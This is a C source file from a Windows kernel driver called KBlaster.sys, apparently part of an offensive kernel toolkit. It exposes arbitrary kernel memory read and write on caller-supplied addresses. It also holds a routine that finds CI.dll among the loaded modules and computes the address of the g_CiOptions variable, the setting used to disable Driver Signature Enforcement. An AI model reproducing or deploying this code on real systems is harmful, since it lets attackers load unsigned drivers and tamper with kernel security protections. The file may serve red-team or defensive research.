/*
* Author:	Angelo Frasca Caccia ( lem0nSec_ )
* Title:	KBlaster.sys ( driver )
* Website:	https://github.com/lem0nSec/KBlast
*/


#include "KBlaster_k_memory.hpp"


NTSTATUS KBlaser_k_memory_manage(IN PKBLAST_MEMORY_BUFFER InBuf, OUT OPTIONAL PVOID OutBuf, KBLAST_MEMORY_ACTION action)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	KBLAST_MEMORY_BUFFER* buf = (KBLAST_MEMORY_BUFFER*)OutBuf;
	MM_COPY_ADDRESS mmCAddress = { 0 };
	SIZE_T old = 0;

	if (MmIsAddressValid(InBuf->ptr) == TRUE)
	{
		switch (action)
		{
		case MEMORY_WRITE:
			mmCAddress.VirtualAddress = (PVOID)InBuf->buffer;
			status = MmCopyMemory(InBuf->ptr, mmCAddress, (SIZE_T)InBuf->size, MM_COPY_MEMORY_VIRTUAL, &old);
			break;

		case MEMORY_READ:
			mmCAddress.VirtualAddress = InBuf->ptr;
			status = MmCopyMemory((PVOID)buf->buffer, mmCAddress, InBuf->size, MM_COPY_MEMORY_VIRTUAL, &old);
			break;

		default:
			break;
		}
	}

	return status;

}


NTSTATUS KBlaster_k_memory_dse(IN ULONG offset, OUT PVOID pOutBuf)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PAUX_MODULE_EXTENDED_INFO pAuxModuleExtendedInfo = 0;
	PVOID p_g_cioptions = 0;
	ULONG64 CiBaseAddress = 0, uCiInitialize = 0, i = 0;
	ULONG szBuffer = 0, nModules = 0;
	KBLAST_BUFFER* outBuffer = (KBLAST_BUFFER*)pOutBuf;
	
	status = AuxKlibQueryModuleInformation(&szBuffer, sizeof(AUX_MODULE_EXTENDED_INFO), NULL);
	if ((status == STATUS_SUCCESS) && (szBuffer != 0))
	{
		pAuxModuleExtendedInfo = (PAUX_MODULE_EXTENDED_INFO)ExAllocatePoolWithTag(PagedPool, szBuffer, POOL_TAG);
		if (pAuxModuleExtendedInfo != 0)
		{
			RtlZeroMemory(pAuxModuleExtendedInfo, szBuffer);
			status = AuxKlibQueryModuleInformation(&szBuffer, sizeof(AUX_MODULE_EXTENDED_INFO), pAuxModuleExtendedInfo);
			
			if (NT_SUCCESS(status))
			{
				nModules = szBuffer / sizeof(AUX_MODULE_EXTENDED_INFO);
				for (i = 0; i < nModules; i++)
				{
					if (strcmp((const char*)pAuxModuleExtendedInfo[i].FullPathName, "\\SystemRoot\\system32\\CI.dll") == 0)
					{
						CiBaseAddress = (ULONG64)pAuxModuleExtendedInfo[i].BasicInfo.ImageBase;
						uCiInitialize = CiBaseAddress + offset;
						if (uCiInitialize != 0)
						{
							p_g_cioptions = (PVOID)(uCiInitialize - 0xAFE8);
							outBuffer->uGeneric = *(PULONG)p_g_cioptions;
							outBuffer->pointer = p_g_cioptions;
							break;
						}
					}
				}

				ExFreePoolWithTag(pAuxModuleExtendedInfo, POOL_TAG);
			}
		}
	}

	return status;

}